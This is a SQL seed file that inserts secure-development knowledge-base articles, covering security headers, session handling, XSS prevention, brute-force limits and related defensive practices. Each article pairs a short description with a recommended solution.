INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Centralized place for security controlsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever security controls do not have a centralized implementation there is a highNEWLINEprobability for bugs or security issues being hidden into your application due to the lossNEWLINEof abstraction and duplication.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure all your different type of security controls have a centralized place of implementation.NEWLINEAlso verify that error handling logic in security controls denies access by default.NEWLINE', 'centralized security controls'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Separated data, controller, display layersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe application should separate data, controller, and display layers in order to make yourNEWLINEapplication more clear and understandable in terms of abstraction due to separation.NEWLINENEWLINEWhenever your application is more organized and abstracted it is much easier to implementNEWLINEless flawed security controls.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure your different type of data layers are separated in your application.NEWLINENEWLINEThe separation of these different layers is also know as a design pattern which goesNEWLINEby the name MVC (model, view, controller).NEWLINE', 'data controller display layer sepperation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Proven authentication mechanismsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever your application has the option for users to authenticate themselvesNEWLINEyour method should be "proven" and secure in the sense of that:NEWLINENEWLINE1. it should comply to some security standards/guidelinesNEWLINE2. Before implementing authentication on a live environment it has to be pentested/audited byNEWLINE   professionals.NEWLINENEWLINE## Solution:NEWLINENEWLINEThere are some general guidelines in order to ensure your authentication mechanismNEWLINEis a "proven" one in order to harden your application against attackers.NEWLINEThese guidelines are listed in the following knowledgebase item:NEWLINENEWLINE- Access control patternNEWLINE', 'proven authentication mechanisms'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Administrative interfaces are not accessible to untrusted partiesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever it is not necessary for administrative pages to be publicly accessible theseNEWLINEpages should have restricted access for users. Whenever these pages are secluded from the restNEWLINEof the application in terms of accessibility this could reduce the attack vector of malicious users.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe first solution is to grant access only from a certain source IP range to theNEWLINEadministrative interface. If that solution would not be possible than it is always recommendedNEWLINEto enforce a step-up or adaptive authentication for logging in into the administrative interface.NEWLINENEWLINERecommended knowledgebase item:NEWLINENEWLINE- Step up or adaptive authenticationNEWLINE', 'administrative interfaces'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Concurrent session handlingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEYou should limit and keep track of all the different active concurrent sessions.NEWLINEWhenever the application discovers concurrent sessions it should always notify the userNEWLINEabout this and should give him the opportunity to end the other sessions.NEWLINENEWLINEWith this defense in place it becomes harder for attackers to hijack a users session sinceNEWLINEthey will be notified about concurrent sessions.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe application should keep track and limit all the granted sessions.NEWLINEIt should store your users IP address, session id and user id. After storing these credentialsNEWLINEit should do regular checks to see if there are:NEWLINENEWLINE1. Multiple active sessions linked to same user idNEWLINE2. Multiple active sessions from different locationsNEWLINE3. Limit and destroy sessions if they become concurrent.NEWLINENEWLINEIf so, the user should be notified and given the opportunity to end the other sessions.NEWLINENEWLINEA best practice would be to create a function which summarizes all the different active sessionsNEWLINEwith the opportunity to terminate them at any given time.NEWLINENEWLINEAs an extra layer of protection the user should also be prompted with the option to terminate allNEWLINEactive sessions whenever he:NEWLINENEWLINE1. changes his passwordNEWLINE2. re-authenticatesNEWLINE3. does step up or adaptive authenticationNEWLINENEWLINEAlong with the renewal of the session identifier in these steps you now have full hardened defenses againstNEWLINEsession hijacking attacks.NEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- Session hijackingNEWLINE- Session fixationNEWLINE', 'concurrent session handling'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Auto escaping technology NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESome frameworks/templates have the option to auto-escape all incoming user-input to harmlessNEWLINEencoded data in order to prevent attacks. However, this auto-escaping functionality is alsoNEWLINEoptional to be disabled. Whenever this auto-escaping function has been disabled your applicationNEWLINEmight be vulnerable to attacks like XSS.NEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever auto-escaping functionality in your application has been disabled for whatever reason, youNEWLINEshould make sure there is other protection in place like a HTML sanitizer in order toNEWLINEprevent attackers from injecting malicious code into your application.NEWLINE', 'Auto escaping technology'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include anti-caching headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAnti-caching headers have the ability to tell the browser,NEWLINEcomputer and proxies what information they may or may not store on the intermediate mediaNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThese headers are also known as the: Cache-control: no-store,no-cache and provideNEWLINEprotection of sensitive information when implemented in the application or web-server.NEWLINENEWLINERightly configured anti caching headers will look like the following as a responseNEWLINENEWLINE	Expires: Tue, 03 Jul 2001 06:00:00 GMTNEWLINE	Last-Modified: {now} GMTNEWLINE	Cache-Control: no-store, no-cache, must-revalidate, max-age=0NEWLINE	Cache-Control: post-check=0, pre-check=0NEWLINE	Pragma: no-cacheNEWLINE', 'Include anti'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client side storageNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAlso known as Offline Storage, Web Storage. Underlying storage mechanism may vary from oneNEWLINEuser agent to the next. In other words, any authentication your application requires canNEWLINEbe bypassed by a user with local privileges to the machine on which the data is stored.NEWLINETherefore, it''s recommended not to store any sensitive information in local storage.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that authenticated data is cleared from client storage, such as the browser DOM, after theNEWLINEsession is terminated. This also goes for other session and local storage information which couldNEWLINEassist an attacker launching an successful attack.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- HTML5 cachingNEWLINE', 'Client side storage'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Log rotation and separationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELog separation is indispensable in order to prevent it from either radically downgrading yourNEWLINEapplication its performance or even causing a Denial of service because the server becomesNEWLINEunavailable due to the flooding of logs.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINELog rotation is an automated process used in system administration in which dated logNEWLINEfiles are archived. Servers which run large applications, such as LAMP stacks, oftenNEWLINElog every request: in the face of bulky logs, log rotation is a way to limit the totalNEWLINEsize of the logs while still allowing analysis of recent events.NEWLINENEWLINELog separation basically means that you have to store your log files on a different partitionNEWLINEas where your OS/application is running on in order to avert a Denial of service attack or the downgradingNEWLINEof your application its performance.NEWLINE', 'Log rotation and seperation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTP strict transport securityNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP Strict Transport Security (HSTS) is an opt-in security enhancement that is specifiedNEWLINEby a web application through the use of a special response header. Once a supported browserNEWLINEreceives this header that browser will prevent any communications from being sent overNEWLINEHTTP to the specified domain and will instead send all communications over HTTPS. It alsoNEWLINEprevents HTTPS click through prompts on browsers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESimple example, using a long (1 year) max-age:NEWLINE    Strict-Transport-Security: max-age=31536000NEWLINENEWLINEIf all present and future subdomains will be HTTPS:NEWLINE    Strict-Transport-Security: max-age=31536000; includeSubDomainsNEWLINENEWLINERecommended: If the site owner would like their domain to be included in the HSTS preload listNEWLINEmaintained by Chrome (and used by Firefox and Safari), then use:NEWLINE    Strict-Transport-Security: max-age=31536000; includeSubDomains; preloadNEWLINENEWLINEThe ''preload'' flag indicates the site owner''s consent to have their domain preloaded. The site ownerNEWLINEstill needs to then go and submit the domain to the list.NEWLINENEWLINEThere is still a window where a user who has a fresh install, or who wipes out their local state,NEWLINEis vulnerable. This is due to the fact that the browser is not yet aware of the fact if the applicationNEWLINEthe it is trying to connect to supports HSTS. Whenever you are added to the preload list,NEWLINEthe application its preference is hard-coded into the browser and all first initial connections willNEWLINEalways be made by HTTPS.NEWLINENEWLINE## CAUTION: NEWLINESite owners can use HSTS to identify users without cookies. This can lead to a significantNEWLINEprivacy leak.NEWLINENEWLINECookies can be manipulated from sub-domains, so omitting the include "includeSubDomains"NEWLINEoption permits a broad range of cookie-related attacks that HSTS would otherwise preventNEWLINEby requiring a valid certificate for a subdomain. Ensuring the "Secure Flag" is set on allNEWLINEcookies will also prevent, some, but not all, of the same attacks.NEWLINE', 'HTTP strict transport security'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# API responses security headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThere are some security headers which should be properly configured in order to protect some API callbacks against Reflective File Download and other type of injections.NEWLINENEWLINEAlso check that the API response is not dynamic, if so use input validation and encoding in order to prevent XSS and Same origin method execution attacks.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all API responses contain X-Content-Type-Options: nosniff and Content-Disposition: attachment; filename="api.json" (or other appropriate filename for the content type).NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Include X content type options headerNEWLINE- RFD and file download injectionsNEWLINE- Same origin method executionNEWLINE', 'API resonses security headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client side technologies not supported natively via W3C browser standardsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen using unsupported client side technologies which are not supported natively viaNEWLINEW3C browser standards. Your application could be open to different types of attacks.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not use Flash, Active-X, Silverlight, NACL, client-side Java or other client side technologiesNEWLINEnot supported natively via W3C browser standards.NEWLINE', 'Do not support untrusted client side technologies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Signed message payloadsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn order to establish trust between two communicating party''s such as servers and clientsNEWLINEthere message payload should be signed by means of public/private key method. This builds trustNEWLINEand makes it harder for attackers to impersonate different users.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that a message payload is signed to ensure reliable transport between client and service.NEWLINE', 'Signed message payloads'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Hardware key vaultNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEKeys should remain in a protected key vault at all times. In particular, ensure that thereNEWLINEis a gap between the threat vectors that have direct access to the data and the threatNEWLINEvectors that have direct access to the keys. This implies that keys should not be storedNEWLINEon the application or web server (assuming that application attackers are part of theNEWLINErelevant threat model).NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all consumers of cryptographic services do not have direct access to key material.NEWLINEIsolate cryptographic processes, including master secrets and consider the use of a hardware key vault (HSM).NEWLINE', 'Hardware key vault'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SOAP based web services compliant with (WS-I) Basic ProfileNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESimple Soap Binding Profile is a specification from the Web Services Interoperability industry consortium. ItNEWLINEis intended as a support profile for the WS-I Basic Profile. This profile defines the way WSDLNEWLINEdocuments are to bind operations to a specific transport protocol SOAP.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the SOAP based web services are making use of the WS-I Basic profile.NEWLINENEWLINESource:NEWLINEhttp://www.ws-i.org/Profiles/SimpleSoapBindingProfile-1.0.htmlNEWLINE', 'SOAP basic profile'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Strong Crypto through all the certificate hierarchyNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen you have an offline PKI setup you need to have solid strong crypto layers.NEWLINEAn attacker will look for weak chains in the hierarchy and abuse them when found.NEWLINEThis can lead to MiTM attacks and impact the 3 security pillars C.I.A.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that only strong algorithms, ciphers, and protocols are used, through all the certificate hierarchy,NEWLINEincluding root and intermediary certificates of your selected certifying authority.NEWLINENEWLINEBecause this is always in flux we recommend to use the SSLlabs free test:NEWLINENEWLINEhttps://www.ssllabs.com/ssltest/NEWLINENEWLINEThese TLS hardening recommendations can then be applied on all servers.NEWLINE', 'CRYPTO CA hierachy'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Build and deploy in a secure fashionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEUsing build platforms on premise or as a service is one of the core components in a SDLC.NEWLINEThese build and deploy servers are sometimes not perfect for performing secure builds or deploys.NEWLINEThis is because the lack of hardening of the OS for security improvements where the applicationNEWLINEcould also benefit from this hardening. Also the access of third party services can lead toNEWLINEcompromise of the secrets or integrity of the code of the application.NEWLINENEWLINE## Solution:NEWLINENEWLINEBuilding you application should always be done on a server that you trust, you are in control andNEWLINEhas the latest security patches and hardening configured. For deploying the application the sameNEWLINErules apply, also think about what type of third party services can access the code or modify it.NEWLINECreating scripts to monitor for bad behavior of a third party service can be an option as an extraNEWLINEquality control check.NEWLINE', 'Build Deploy secure'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include anti clickjacking headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEClickjacking, also known as a "UI redress attack", is when an attacker uses multipleNEWLINEtransparent or opaque layers to trick a user into clicking on a button or link on anotherNEWLINEpage when they were intending to click on the top level page. Thus, the attacker isNEWLINE"hijacking" clicks meant for their page and routing them to another page, most likelyNEWLINEowned by another application, domain, or both.NEWLINENEWLINEUsing a similar technique, keystrokes can also be hijacked. With a carefully craftedNEWLINEcombination of stylesheets, iframes, and text boxes, a user can be led to believe theyNEWLINEare typing in the password to their email or bank account, but are instead typing into anNEWLINEinvisible frame controlled by the attacker.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINETo avoid your application from being clickjacked you can add the X-frame-Options headerNEWLINEto your application. These headers can be configured as:NEWLINENEWLINE    X-frame-Options: denyNEWLINENEWLINEThe page cannot be displayed in a frame, regardless of the site attempting to do so.NEWLINENEWLINE    X-Frame-Options: sameorign  NEWLINENEWLINEThe page can only be displayed in a frame on the same origin as the page itself.NEWLINENEWLINE    X-Frame-Options: ALLOW-FROM uriNEWLINENEWLINEThe page can only be displayed in a frame on the specified origin.NEWLINENEWLINEYou may also want to consider to include "Framebreaking/Framebusting" defense for legacyNEWLINEbrowsers that do not support X-Frame-Option headers.NEWLINENEWLINESource:NEWLINEhttps://www.codemagi.com/blog/post/194NEWLINE', 'Include anti clickjacking headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Signed application componentsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen an application don''t use signed application components an attacker can easily modify partsNEWLINEof the application and load inject a backdoor into the application. Also the attacker couldNEWLINEmodify business logic in the application without the application notice. Signed applicationNEWLINEcomponents can help harden your application and make it noticeable when an attacker tries toNEWLINEmodify the code in the application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINECreate for the different components in the application signed signatures and verify these inNEWLINEthe application at starting of the application and at run-time level.NEWLINE', 'Signed application components'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Build process security hardeningNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEBuilding you application should always be done on a server that you trust, you are in control andNEWLINEhas the latest security patches and hardening configured. In some applications you can use securityNEWLINEtechniques and modules that can protect your application from know security issues. Always use theseNEWLINEtechniques when they are available.NEWLINENEWLINE## Solution:NEWLINENEWLINEEnsure that build processes for system level languages have all security flags enabled, such asNEWLINEASLR, DEP, and other security checks specific for your application need.NEWLINE', 'Build proccess security hardening'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sanitize unstructured data NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEVerify that unstructured data is sanitized to enforce generic safety measures. When this is notNEWLINEsetup an attacker can use this unstructured data to harm the application and perform injections.NEWLINENEWLINE## Solution:NEWLINENEWLINEUnstructured data needs to be sanitized to enforce generic safety measures for example:NEWLINENEWLINE- allowed charactersNEWLINE- character length,NEWLINENEWLINEAlso some characters are potentially harmful in given context and thus should be escaped.NEWLINE(e.g. natural names with Unicode or apostrophes, such as &#x306D;&#x3053; or O''Hara)NEWLINE', 'Sanitize unstructured data'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Zero keys and secrets before destroying themNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAttackers are always on the lookout for secrets of a server of computer. When these secrets areNEWLINEaccessible for an attacker because the key was not properly being destroyed then this can lead toNEWLINEsecurity issues.NEWLINENEWLINE## Solution:NEWLINENEWLINEBefore destroying a secret or a security key it''s needed by the application to overwrite the secretNEWLINEwith a new value zeroes. This will make it harder for an attacker to obtain the correct old valueNEWLINEof the secret or security key.NEWLINE', 'Keys secrets zeroed'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# All keys and passwords should be replaceableNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIt always can happen that you need the keys or the passwords of the application or in componentsNEWLINEthat are needed by the application to work in a secure state. When these keys needs to be revokedNEWLINEbecause the password was leaked or an administrator leaving the company it''s always smart to haveNEWLINEthe possibility to revoke the keys or passwords without to much problems.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify in the application and components it uses that it''s possible to replace the used keys andNEWLINEpasswords. Also replace default keys and passwords after the installation of the application.NEWLINE', 'Keys passwords should be replaceable'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Enforce random numbers are created with proper entropy at runtimeNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThere are some techniques attackers use to decrease the entropy pool of the system so it willNEWLINEcreate weak and predictable ''random'' numbers that should not be used in crypto functions.NEWLINENEWLINE## Solution:NEWLINENEWLINEEnforce in your application that random numbers are created with proper entropy even when theNEWLINEapplication is under heavy load, or that the application degrades gracefully in such circumstances.NEWLINE', 'Enforce random numbers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Segregated componentsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIt''s always possible that an attacker can find a security flaw and abuse this to gain accessNEWLINEto the server. From here the attacker tries to further infiltrate into the network and otherNEWLINEimportant components of the application for example the database. This database should be firewalledNEWLINEcorrectly so it''s not accessible from the internet. Also this database has it own server and is in aNEWLINEdifferent segment of the network. Always apply INGRESS and EGRESS filtering for all the servers used.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that components are segregated from each other via a defined security control, such asNEWLINEnetwork segmentation, firewall rules, or cloud based security groups.NEWLINE', 'Segregated components'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Personally Identifiable Information (PII) protection measurementsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThere should be extra care taken into account when you are dealing with PII in yourNEWLINEapplication. There are multiple laws in countries that demand proper protection byNEWLINEmeans of SSL/TLS for when the data is in transit and encrypted with pub priv key systemNEWLINEwhen stored on the disk. This is needed to protect the user from identity theft and fraud.NEWLINENEWLINE## Solution:NEWLINENEWLINEPersonally Identifiable Information needs to be stored encrypted at rest and ensure that allNEWLINEcommunication goes via protected channels like SSL/TLS.NEWLINE', 'PII protection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include X-XSS-Protection headerNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis header enables the Cross-site scripting (XSS) filter built into most recentNEWLINEweb browsers. It is usually enabled by default anyway, so the role of this header is to re-enable the filter for this particular website if it was disabled by the user. This header is supported in IE 8 and in Chrome 4.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThese headers are also known as the: X-XSS-Protection: 1; mode=block and provide protection against XSS attacks when implemented in the application or web-server.NEWLINE', 'Include X XSS'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include X-Content-Type-Options headerNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe only defined value, nosniff, prevents Internet Explorer and Google Chrome fromNEWLINEMIME-sniffing a response away from the declared content-type.NEWLINEThis also applies to Google Chrome, when downloading extensions.NEWLINEThis reduces exposure to drive-by download attacks and sites serving user uploadedNEWLINEcontent that, by clever naming, could be treated by MSIE as executable or dynamic HTMLNEWLINEfiles.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThese headers are also known as the: X-Content-Type-Options: nosniff;NEWLINEand provide protection against Mime content type attacks when implemented in theNEWLINEapplication or webserver.NEWLINE', 'Include X Content Type Options header'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include Strict-Transport-Security headerNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP Strict-Transport-Security (HSTS) enforces secure (HTTP over SSL/TLS) connections toNEWLINEthe server. This reduces impact of bugs in web applications leaking session data throughNEWLINEcookies and external links and defends against Man-in-the-middle attacks. HSTS alsoNEWLINEdisables the ability for user''s to ignore SSL negotiation warningsNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThese headers are also known as the: Strict-Transport-Security: max-age=16070400:NEWLINEincludeSubDomains and provide protection against SSL Strip attacks when implemented in theNEWLINEapplication or webserver.NEWLINENEWLINEWhen connecting to an HSTS host for the first time, the browser won''t know whether or notNEWLINEto use a secure connection, because it has never received an HSTS header from that host.NEWLINEConsequently, an active network attacker could prevent the browser from ever connectingNEWLINEsecurely (and even worse, the user may never realize something is amiss). To mitigateNEWLINEthis attack, you can add your application to a preload list which makes HSTS enforced by default.NEWLINEWhen a user connects to one of these hosts for the first time, the browser will know thatNEWLINEit must use a secure connection. If a network attacker prevents secure connections to theNEWLINEserver, the browser will not attempt to connect over an insecure protocol, thusNEWLINEmaintaining the user''s security.NEWLINENEWLINEVisit:NEWLINE    https://hstspreload.appspot.com/NEWLINEHere you can find how to add your application to HSTS preloadNEWLINE', 'Include Strict Transport Security header'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sensitive information stored in cookiesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESensitive data should not be stored in a cookie.NEWLINEBecause the cookie is also used client-side and is adaptable and thus makingNEWLINEit content readable. A hacker could gain access to a cookie through cross site scriptingNEWLINEattacks and gain the sensitive information storedNEWLINEin the targets cookie.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not store sensitive information in cookies.NEWLINE', 'sensitive information stored in cookies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client-side state managementNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn application can implement all kinds of logic rules through javascript and html.NEWLINEHowever, these are client-side constraints that a hacker can easily disable or modify.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUser restrictions should always be imposed by server side techniques insteadNEWLINEof client side constraints.NEWLINE', 'Client side state management'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Too verbose authentication-failure loggingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe error messages that are displayed when a user fails to login into an applicationNEWLINEshould selected with caution. When this error message gives away too much information,NEWLINEthis information can be exploited by a hacker.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe application should never publish available usernames. When an attacker gains thisNEWLINEinformation he increases his attack vector and reduces the timeNEWLINErequired to identify accounts.NEWLINENEWLINEI.e:NEWLINENEWLINEImagine an forgot password function where the user enters his username in order for theNEWLINEapplication to send a new password to his email address, the user enters a correct usernameNEWLINEand the application responds with:NEWLINENEWLINEEmail successfully send to your email address.NEWLINEWhen the user enters a incorrect username it says.NEWLINEError: user does not exists.NEWLINENEWLINEThis function would be vulnerable to username enumerationNEWLINE', 'Too verbose authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Brute-force password guessingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELogin functions should not abused in an automated way that an attacker could create aNEWLINEscript that contains a list of usernames and passwords, which he could use against yourNEWLINElogin function in order to gain unauthorized access to user accounts.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEImplement a method that limit the amount of tries with automated tools.NEWLINESome examples are using a CAPTCHA or a tarpit(rate-limiting) method.NEWLINE', 'Brute force password guessing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XSS injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEEvery time the application gets user-input, whether this showing it on screen or processingNEWLINEthis data in the application background, these parameters should be escaped for maliciousNEWLINEcode in order to prevent cross site scripting injections.NEWLINEWhen an attacker gains the possibility to perform a XSS injection,NEWLINEhe is given the opportunity to inject HTML and javascript code directly into theNEWLINEapplication. This could lead to accounts being compromised by stealing session cookies,NEWLINEor directly affect the operation of the target application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn order to prevent XSS injections all user-input should be escaped or encoded.NEWLINEYou could start by sanitising user-input as soon as it is inserted into the application,NEWLINEby preference using a so called white-listing method.NEWLINEThis means u should not checking for malicious content like the tags or anything,NEWLINEbut only allowing the expected input. Every input which is outside of the intended operationNEWLINEof the application should immediately be detected, logged en rejected.NEWLINENEWLINEThe second step would be encoding all the parameters or user-input before putting this inNEWLINEyour html with encoding libraries specially designed for this purpose.NEWLINENEWLINEYou should take into consideration that there are several contexts for encoding user-input forNEWLINEescaping XSS injections. These contexts are amongst others:NEWLINENEWLINEHTML encodingNEWLINEThis is for whenever your user-input is displayed directly into your HTMLNEWLINENEWLINEHTML attribute encodingNEWLINEThis type of encoding/escaping should be applied whenever your user input is displayed into the attribute ofNEWLINEyour HTML tagsNEWLINENEWLINEHTML URL encodingNEWLINEThis type of encoding/escaping should be applied to whenever you are using user-input into a HREFNEWLINEtag.NEWLINENEWLINEJavascript encodingNEWLINEWhenever parameters are rendered via javascript your application will detect normal injectionsNEWLINEin the first instant. But your application still remains vulnerable to javascript encoding which will notNEWLINEbe detected by the normal encoding/escaping methods.NEWLINE', 'xss injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Denial-of-service by locking out accountsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever there is offered the opportunity to log into the application it should not lockNEWLINEout accounts. A hacker could abuse this function to make the application deny accessNEWLINEtowards its power users.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe application should not lock-out users when they enter false login credentials.NEWLINE', 'Denial of service by locking out accounts'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Predictable password and/or token generationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINETokens or passwords that are used within the application must contain a high entropy inNEWLINEorder to prevent the prediction of these values.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINETokens should contain a high level entropy and randomness to prevent predictable token generation.NEWLINEAll random numbers, random file names, random GUIDs, and random must be generated usingNEWLINEthe cryptographic module''s approved random number generatorNEWLINEwhen these random values are intended to be unguessable by an attackerNEWLINE', 'Predictable password and or token generation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Unauthorized credential changesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn application which offers a user login functionality, usually has an administration pageNEWLINEwhere his user-data can be modified. When the user wants to change this data he shouldNEWLINEspecify his current password.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen changing user credentials or email address the user must always enter a validNEWLINEpassword in order to implement the changes. This is also called re-authentication orNEWLINEstep-up / adaptive authentication. Whenever a user "re-authenticates" himself the currentNEWLINEsessionid value should also be refreshed in order to fend of so called "session hijackers"NEWLINE', 'Unauthorized credential changes'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Double decoding of headers/parametersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEDouble decoding is a problem which often occurs when multiple servers are used in which aNEWLINEconfiguration error is made.NEWLINEA hacker can encode his payload differently so it will not be recognized by an WAF or IDSNEWLINEand also bypass the escaping of the application.NEWLINENEWLINEBy using double encoding it''s possible to bypass security filters that only decode userNEWLINEinput once. The second decoding process is executed by the backend platform or modulesNEWLINEthat properly handle encoded data, but don''t have the corresponding security checks inNEWLINEplace.NEWLINENEWLINEAttackers can inject double encoding in pathnames or query strings to bypass theNEWLINEauthentication schema and security filters in use by the web application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEOnly one web-server should decode/encode the data.NEWLINE', 'Double decoding of headers parameters'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Resource identifier injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA resource identifier injection basically means that the attacker can determine whichNEWLINEresources are loaded into the web application.NEWLINEAn attacker could thus influence the operation of the web application and redirect usersNEWLINEto other websites. This attack consists of changing resource identifiers used by anNEWLINEapplication in order to perform a malicious task. When an application permits a userNEWLINEinput to define a resource, like a file name or port number,NEWLINEthis data can be manipulated to execute or access different resources.NEWLINEIn order to be properly executed, the attacker must have the possibility to specify aNEWLINEresource identifier through the application form and the application must permit the execution.NEWLINEThe resource type affected by user input indicates the content type that may be exposed.NEWLINEFor example, an application that permits input of special characters like period, slash,NEWLINEand backslash is risky when used in methods that interact with the file system.NEWLINEThe resource injection attack focuses on accessing other resources than the localNEWLINEfilesystem, which is different attack technique known as a Path Manipulation attack.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESafe use of resource identifiers can be done by performing authorisation checks if theNEWLINEidentifier is belonging to the user.NEWLINE', 'Resource identifier injection'); 
